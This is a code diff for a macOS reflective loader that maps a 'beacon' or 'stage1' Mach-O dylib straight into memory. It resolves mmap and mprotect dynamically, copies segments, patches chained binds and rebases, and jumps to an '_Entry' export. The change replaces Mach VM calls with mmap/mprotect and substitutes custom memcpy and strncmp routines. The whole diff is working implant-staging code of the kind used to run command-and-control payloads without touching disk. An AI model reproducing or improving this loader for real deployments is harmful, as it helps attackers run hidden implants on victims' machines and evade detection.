@@ -19,8 +19,6 @@
 #include "libc.h"
 #include "end.h"
 
-#undef mach_task_self
-
 typedef struct _SYMBOL {
     char* name;
     void* addr;
@@ -29,7 +27,7 @@ typedef struct _SYMBOL {
 #pragma clang optimize off
 uintptr_t FindImageBase() {
 #if _DEBUG
-    FILE* f = fopen("libexample.dylib", "rb");
+    FILE* f = fopen("/Users/kyle/Documents/s1nix/cmake-build-release-macos-arm64/libstage1.dylib", "rb");
     if (f == NULL) {
         printf("Failed to open file\n");
         return 0;
@@ -49,7 +47,7 @@ uintptr_t FindImageBase() {
     return (uintptr_t)buffer;
 
 #else
-    return (uintptr_t)&TrimLdr + 6;
+    return (uintptr_t)&TrimLdr + 4;
 
 #endif
 }
@@ -73,24 +71,21 @@ uintptr_t ReflectiveLoader() {
     PIC_STRING(str_libsystem_kernel, "libsystem_kernel.dylib");
     PIC_STRING(str_libdyld, "libdyld.dylib");
     PIC_STRING(str_libsystem_malloc, "libsystem_malloc.dylib");
-    PIC_STRING(str_vm_protect, "vm_protect");
-    PIC_STRING(str_vm_allocate, "vm_allocate");
+    PIC_STRING(str_mprotect, "mprotect");
+    PIC_STRING(str_mmap, "mmap");
     PIC_STRING(str_dlsym, "dlsym");
     PIC_STRING(str_dlopen, "dlopen");
     PIC_STRING(str_calloc, "calloc");
     PIC_STRING(str_realloc, "realloc");
-    PIC_STRING(str_mach_task_self, "mach_task_self");
 
-    _vm_protect vm_protect = (_vm_protect)GetProcAddress(str_libsystem_kernel, str_vm_protect);
-    _vm_allocate vm_allocate = (_vm_allocate)GetProcAddress(str_libsystem_kernel, str_vm_allocate);
+    _mprotect mprotect = (_mprotect)GetProcAddress(str_libsystem_kernel, str_mprotect);
+    _mmap mmap = (_mmap)GetProcAddress(str_libsystem_kernel, str_mmap);
     _dlsym dlsym = (_dlsym)GetProcAddress(str_libdyld, str_dlsym);
     _dlopen dlopen = (_dlopen)GetProcAddress(str_libdyld, str_dlopen);
-    _calloc calloc = (_calloc)GetProcAddress( str_libsystem_malloc, str_calloc);
+    _calloc calloc = (_calloc)GetProcAddress(str_libsystem_malloc, str_calloc);
     _realloc realloc = (_realloc)GetProcAddress(str_libsystem_malloc, str_realloc);
-    _mach_task_self mach_task_self = (_mach_task_self)GetProcAddress(str_libsystem_kernel, str_mach_task_self);
-    if (vm_allocate == NULL ||
-        vm_protect == NULL ||
-        mach_task_self == NULL ||
+    if (mprotect == NULL ||
+        mmap == NULL ||
         dlsym == NULL ||
         dlopen == NULL ||
         calloc == NULL ||
@@ -118,8 +113,8 @@ uintptr_t ReflectiveLoader() {
     }
 
     uintptr_t newBaseAddr = 0;
-    vm_allocate(mach_task_self(), &newBaseAddr, maxAddr+maxLength, VM_FLAGS_ANYWHERE);
-    if (newBaseAddr == 0) {
+    newBaseAddr = (uintptr_t)mmap(NULL, maxAddr+maxLength, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_JIT, -1, 0);
+    if ((void*)newBaseAddr == MAP_FAILED) {
         PRINT("[!] Failed to allocate memory for rDylib!\n");
         return -1;
     }
@@ -140,28 +135,29 @@ uintptr_t ReflectiveLoader() {
             section_64 *section64;
 
             loadAddr = (void*)(newBaseAddr + (uintptr_t)segment->vmaddr);
-            memcpy(loadAddr, (void*)(beaconBaseAddress + (uintptr_t)segment->fileoff), segment->filesize);
+            fnmemcpy(loadAddr, (void*)(beaconBaseAddress + (uintptr_t)segment->fileoff), segment->filesize);
+
+            uintptr_t alignedStart = (uintptr_t)loadAddr & ~(0x1000 - 1);
+            uintptr_t alignedEnd = (uintptr_t)(((uintptr_t)loadAddr+segment->vmsize) + 0x1000 - 1) & ~(0x1000 - 1);
+            ret = mprotect((void*)alignedStart, alignedEnd - alignedStart, PROT_READ | PROT_WRITE);
+            if (ret == -1) {
+                PRINT("\t\t[!] Error during mprotect: %s\n", strerror(errno));
+                return -1;
+            }
 
             section64 = (section_64*)((char*)segment + sizeof(segment_command_64));
             for (uint32_t j = 0; j < segment->nsects; j++) {
                 section_64 section = section64[j];
                 void *sectionLoadAddr = (void*)(newBaseAddr + (uintptr_t)section.addr);
-
-                ret = vm_protect(mach_task_self(), (vm_address_t)sectionLoadAddr, section.size, false, PROT_READ | PROT_WRITE);
-                if (ret == -1) {
-                    PRINT("\t\t[!] Error during vm_protect: %s\n", strerror(errno));
-                    return -1;
-                }
-
                 if (!(section.flags & S_ZEROFILL)) {
-                    memcpy(sectionLoadAddr,  (void*)(beaconBaseAddress + section.offset), section.size);
+                    fnmemcpy(sectionLoadAddr,  (void*)(beaconBaseAddress + section.offset), section.size);
                 }
+            }
 
-                ret = vm_protect(mach_task_self(), (vm_address_t)sectionLoadAddr, section.size, false, segment->initprot);
-                if (ret == -1) {
-                    PRINT("\t\t[!] Error during vm_protect: %s\n", strerror(errno));
-                    return -1;
-                }
+            ret = mprotect((void*)alignedStart, alignedEnd - alignedStart, segment->initprot);
+            if (ret == -1) {
+                PRINT("\t\t[!] Error during mprotect: %s\n", strerror(errno));
+                return -1;
             }
         }
         else if(loadCmd->cmd == LC_SYMTAB) {
@@ -187,7 +183,7 @@ uintptr_t ReflectiveLoader() {
         else if(loadCmd->cmd == LC_DYSYMTAB) {
             dysymtab_command* dysymtab = (dysymtab_command*)loadCmd;
             indirectSymbols = (void *)calloc(sizeof(int), dysymtab->nindirectsyms);
-            memcpy(indirectSymbols, (void *) (beaconBaseAddress + dysymtab->indirectsymoff),
+            fnmemcpy(indirectSymbols, (void *) (beaconBaseAddress + dysymtab->indirectsymoff),
                    sizeof(int) * dysymtab->nindirectsyms);
         }
         else if(loadCmd->cmd == LC_LOAD_DYLIB) {
@@ -231,7 +227,7 @@ uintptr_t ReflectiveLoader() {
                     continue;
                 }
 
-                if (strncmp(symbols[j].name, name, PATH_MAX) == 0) {
+                if (fnstrncmp(symbols[j].name, name, PATH_MAX) == 0) {
                     func = symbols[j].addr;
                     break;
                 }
@@ -288,11 +284,11 @@ uintptr_t ReflectiveLoader() {
             while (bind != prevBind) {
                 prevBind = bind;
                 if (bind->bind == 1) {
-                    memcpy(&curBind, bind, sizeof(dyld_chained_ptr_64_bind));
+                    fnmemcpy(&curBind, bind, sizeof(dyld_chained_ptr_64_bind));
                     *(void**)bind = imports[curBind.ordinal];
                     bind = (dyld_chained_ptr_64_bind*)((char*)bind + (4 * curBind.next));
                 } else {
-                    memcpy(&curRebase, bind, sizeof(dyld_chained_ptr_64_rebase));
+                    fnmemcpy(&curRebase, bind, sizeof(dyld_chained_ptr_64_rebase));
                     *(void**) bind = (void*)(newBaseAddr + curRebase.target);
                     bind = (dyld_chained_ptr_64_bind*)((char*)bind + (4 * curRebase.next));
                 }
@@ -303,7 +299,7 @@ uintptr_t ReflectiveLoader() {
     void* exportAddr = NULL;
     PIC_STRING(str_Entry, "_Entry");
     for (int i = 0; i < symbolCount; i++) {
-        if (symbols[i].name != NULL && strncmp(symbols[i].name, str_Entry, 7) == 0) {
+        if (symbols[i].name != NULL && fnstrncmp(symbols[i].name, str_Entry, 7) == 0) {
             exportAddr = symbols[i].addr;
             break;
         }
